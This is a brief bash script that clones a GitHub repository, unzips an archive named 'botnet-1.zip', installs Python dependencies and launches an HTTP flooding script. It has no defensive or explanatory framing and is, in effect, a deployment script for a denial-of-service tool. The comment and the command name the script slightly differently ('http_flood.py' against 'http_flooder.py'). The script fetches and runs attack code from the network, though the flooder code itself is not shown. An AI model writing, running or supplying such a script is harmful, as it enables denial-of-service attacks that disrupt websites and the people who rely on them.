#!/bin/bash

# Clone the repository
git clone https://github.com/Nashit-panel/Moye.git

# Change to the Moye directory
cd Moye

# Unzip the botnet-1.zip file
unzip botnet-1.zip

# Change to the botnet directory
cd botnet

# Install Python 3 and pip
apt update
apt install -y python3 python3-pip

# Install the required Python packages
pip install -r requirements.txt

# Run the http_flood.py script
python3 http_flooder.py
